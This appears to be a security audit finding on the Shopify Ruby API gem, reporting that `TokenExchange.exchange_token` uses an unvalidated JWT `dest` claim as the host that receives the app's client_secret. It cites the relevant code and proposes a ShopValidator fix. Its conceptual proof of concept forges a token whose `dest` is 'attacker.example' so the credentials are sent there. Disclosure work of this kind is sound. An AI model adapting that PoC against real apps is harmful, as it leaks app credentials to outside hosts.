Found the analog. The critical binding difference is that `TokenExchange.exchange_token` derives `dest_shop` directly from the unvalidated JWT `dest` claim (`jwt_payload.shop`, which is simply `@dest.gsub("https://", "")`) and uses it—unsanitized—as the request host that receives the app's `client_id`/`client_secret`, whereas the sibling method `TokenExchange.migrate_to_expiring_token` (and `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`) run the shop through `Utils::ShopValidator.sanitize!` before using it as a request host.

### Title
Unsanitized JWT `dest` claim used as request host lets attacker-controlled domain receive the app's `client_id`/`client_secret` in `TokenExchange.exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
### Finding Description
`JwtPayload` verifies the JWT signature and the `aud` claim against `Context.api_key` [1](#0-0) , but it never validates that `dest` is an actual `*.myshopify.com`/trusted Shopify domain — `shop` is simply `@dest.gsub("https://", "")` [2](#0-1) . `TokenExchange.exchange_token` takes this unvalidated value as `dest_shop` and builds an `Auth::Session` whose `shop` becomes the outbound request host, then sends the app's `client_id` and `client_secret` to that host: [3](#0-2) . `HttpClient` turns `session.shop` directly into `https://#{session.shop}` [4](#0-3) , so whatever string sits in `dest` becomes the literal destination host for the POST containing the secret.

Contrast this with the sibling flows in the very same module/class, which call `Utils::ShopValidator.sanitize!(shop)` and raise `InvalidShopError` for any host outside `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` before using it as the request host: `TokenExchange.migrate_to_expiring_token` [5](#0-4) , `ClientCredentials.client_credentials` [6](#0-5) , and `RefreshToken.refresh_access_token` [7](#0-6) .

The identity binding that should hold is: **the host that receives the app's `client_secret` == a value verified to be a trusted Shopify domain**. In `exchange_token`, the equality that actually holds is: **the host that receives the `client_secret` == whatever byte-string is parsed out of the `dest` claim of a JWT that only proves it was signed with `api_secret_key` and intended for this `aud`** — not that `dest` itself is a legitimate Shopify host. Session tokens are typically obtained by embedded apps from App Bridge inside the Shopify Admin iframe and are signed by Shopify, so in the normal flow `dest` is trustworthy. However, nothing in this gem enforces that constraint at the code level: the `JwtPayload` class only checks signature/`aud`/`exp`/`nbf`, never that `dest` resolves to `*.myshopify.com` or another `TRUSTED_SHOPIFY_DOMAINS` entry the way `ShopValidator` does for the other three OAuth-adjacent flows.

### Impact Explanation
This maps to the report's bug class ("a field acted on but not covered by [a] verification step that other paths rely on") applied to a host-vs-credential binding: if a caller obtains any string that will pass `JwtPayload`'s checks (signature by the shop's shared secret, correct `aud`, not expired/not-yet-valid) but with a `dest` value that is not a genuine Shopify domain, `exchange_token` will unconditionally POST the app's `client_id`/`client_secret` to that attacker-influenced host — this is exactly the "SSRF with the app's credentials" / credential-leakage class called out as High severity.

### Likelihood Explanation
Exploitability depends entirely on whether an attacker can produce or influence a JWT that passes `JwtPayload`'s validation with a non-Shopify `dest`. Since `aud` must equal `Context.api_key` and the token must be signed with `Context.api_secret_key` (or the configured `old_api_secret_key`), an attacker without knowledge of the app's secret cannot forge such a token from scratch — this bounds the practical likelihood without a secret-leak or a proxy/relay bug elsewhere that lets a third party get a validly-signed token with a manipulated `dest` (e.g., a malicious/compromised iframe host, or another integration that echoes back a signed token). The inconsistency itself — this code path skipping the exact `ShopValidator` check that its sibling methods apply — is a genuine root-cause defect in the gem, independent of how likely token acquisition is in a given deployment.

### Recommendation
Route `dest_shop` through `Utils::ShopValidator.sanitize!` (as `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token` already do) before using it to build the `Auth::Session` / request host in `exchange_token`:
```ruby
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = Utils::ShopValidator.sanitize!(jwt_payload.shop)
```
This ensures the host receiving `client_id`/`client_secret` is always verified to be a member of `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` (or the configured `myshopify_domain`), closing the gap between the trust asserted by JWT validation and the trust actually required for sending the app's credentials.

### Proof of Concept
Conceptual (cannot be executed without a signed token whose `dest` an attacker controls, which requires possession of `api_secret_key`/`old_api_secret_key` or some other mechanism to obtain a validly-signed token with an attacker-chosen `dest`):
```ruby
# Assume attacker can obtain (e.g. via a compromised relay, replay, or leaked-but-rotated old secret)
# a JWT signed for this app's aud with dest set to an attacker-controlled host:
payload = {
  iss: "https://attacker.example/admin",
  dest: "https://attacker.example",     # not a trusted Shopify domain
  aud: ShopifyAPI::Context.api_key,
  sub: "1", exp: Time.now.to_i + 10, nbf: Time.now.to_i - 10,
  iat: Time.now.to_i, jti: "x",
}
forged_token = JWT.encode(payload, ShopifyAPI::Context.api_secret_key, "HS256")

# exchange_token will POST client_id/client_secret to https://attacker.example/admin/oauth/access_token
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
Compare with `migrate_to_expiring_token(shop: "attacker.example", ...)`, which would raise `ShopifyAPI::Errors::InvalidShopError` via `ShopValidator.sanitize!` [8](#0-7)  — demonstrating the inconsistency between the two sibling flows.

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L43-44)
```ruby
        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-115)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-33)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-33)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: "refresh_token",
            refresh_token:,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/utils/shop_validator.rb (L56-64)
```ruby
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
